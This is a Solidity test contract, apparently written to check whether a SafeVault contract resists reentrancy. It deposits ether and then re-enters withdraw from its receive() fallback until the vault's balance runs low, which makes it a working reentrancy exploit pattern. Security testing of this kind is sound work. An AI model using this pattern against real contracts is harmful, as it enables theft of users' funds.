// test/ReentrancyAttack.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../contracts/SafeVault.sol";

//@author Derek Christopher

contract ReentrancyAttack {
    SafeVault public vault;
    uint256 public stolenAmount;
    bool public attackSuccessful;

    constructor(address _vaultAddress) {
        vault = SafeVault(_vaultAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "Need to deposit something");
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.withdraw(msg.value);
        } else {
            attackSuccessful = true;
        }
    }
}
